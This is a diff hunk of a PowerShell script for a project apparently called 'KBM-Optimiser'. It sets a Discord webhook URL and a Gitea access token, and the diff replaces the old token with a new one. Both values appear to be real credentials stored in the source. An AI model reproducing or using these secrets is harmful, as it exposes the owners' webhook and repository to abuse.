@@ -21,7 +21,7 @@ Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
 $main_webhook = "https://discord.com/api/webhooks/1447925854016508021/MnC95Tp9RwVh2bIWhpMvwcatZ-8oWUjscCVV4iyVFZa6bvpEiGL3woO38m11QbqMV0Ry"
-$gitea_token = "baa9d69ca354aa7541028cd201d8062600d4291f"
+$gitea_token = "0251b43c1d007823c180cc0a99b1a927db23a3cb"
 $repo_owner = "Boosterr"
 $repo_name = "KBM-Optimiser"
 
